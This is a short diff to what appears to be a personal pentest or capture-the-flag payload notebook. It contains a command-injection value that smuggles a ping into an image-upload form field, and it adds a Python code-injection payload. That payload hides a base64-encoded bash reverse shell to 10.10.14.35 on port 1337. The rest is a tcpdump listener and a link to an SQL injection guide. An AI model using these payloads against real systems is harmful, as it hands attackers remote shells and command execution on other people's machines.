@@ -16,3 +16,6 @@ https://nav1n0x.gitbook.io/advanced-sql-injection-techniques
 
 sudo tcpdump -ni tun0 icmp
 photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+10.10.14.5&dimensions=30x20
+
+')+ str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNS8xMzM3IDA+JjE=|base64 -d|bash'))#
+
